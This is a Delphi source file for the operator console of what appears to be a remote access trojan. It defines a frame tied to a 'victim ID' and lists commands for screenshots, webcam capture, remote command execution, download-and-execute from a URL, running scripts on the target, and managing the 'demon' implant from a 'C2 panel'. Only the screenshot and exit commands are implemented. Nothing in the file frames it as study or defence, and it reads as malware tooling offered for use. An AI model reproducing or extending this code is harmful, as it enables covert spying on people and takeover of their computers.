unit FrameShell;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls,
  Vcl.ExtCtrls, Vcl.ComCtrls;

type
  TFrame1 = class(TFrame)
    Splitter1: TSplitter;
    Memo1: TMemo;
    Edit1: TEdit;
    Image1: TImage;
    PageControl1: TPageControl;
    procedure Edit1KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
  private
    { Private declarations }
    FParentTab: TTabSheet;
  public
    ThisFramesVictimID: string;
    property ParentTab: TTabSheet read FParentTab write FParentTab;
  end;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TFrame1.Edit1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  Command: string;
begin
  // Suppress the beep sound when pressing Enter
  if Key = VK_RETURN then
  begin
    Command := Edit1.Text; // Get the command and trim spaces

    if Command = '' then
    begin
      // Clear input if there's no command
      Edit1.Clear;
      Exit; // Exit early if there's no command
    end;

    Memo1.Lines.Add(Command); // Add the command to the memo log

    // Handle specific commands
    if Command = '/help' then
    begin
      Memo1.Lines.Add('List of commands and what they do:');
      Memo1.Lines.Add('/help - shows list of commands.');
      Memo1.Lines.Add
        ('/screenshot - takes a screenshot of the screen and displays it.');
      Memo1.Lines.Add
        ('/camera - takes a picture of the webcam and displays it.');
      Memo1.Lines.Add('/cmd [text] - runs a command.');
      Memo1.Lines.Add('/info - Shows info on the system.');
      Memo1.Lines.Add('/down [URL] - Downloads file from URL.');
      Memo1.Lines.Add
        ('/downexec [URL] - Downloads file from URL and executes it.');
      Memo1.Lines.Add('/script [NAME] - runs the selected script on user.');
      Memo1.Lines.Add('/script -l - Show list of scripts you have downloaded.');
      Memo1.Lines.Add('/uninstall - Uninstalls demon from their system.');
      Memo1.Lines.Add('/close - closes Demon.');
      Memo1.Lines.Add('/disconnect - disconnects demon from the C2 panel.');
      Memo1.Lines.Add('/reconnect - reconnects demon to the C2 panel.');
    end
    else if Command = '/screenshot' then
    begin
      SendToSelectedClient(Form1.PageControl3.ActivePage.Caption, 'SSShell|');
    end
    else if Command = '/exit' then
    begin
      Memo1.Lines.Add('Exiting...');
      Edit1.Clear;
      if Assigned(Self.ParentTab) then
      begin
        Form1.PageControl3.ActivePageIndex := 0;
        Self.ParentTab.Free; // This will automatically free the frame as well
      end;
    end
    else
    begin
      Memo1.Lines.Add('Unknown command: ' + Command);
    end;

    Edit1.Clear; // Clear the input after processing
    Key := 0; // Prevent the beep sound
  end;
end;

end.
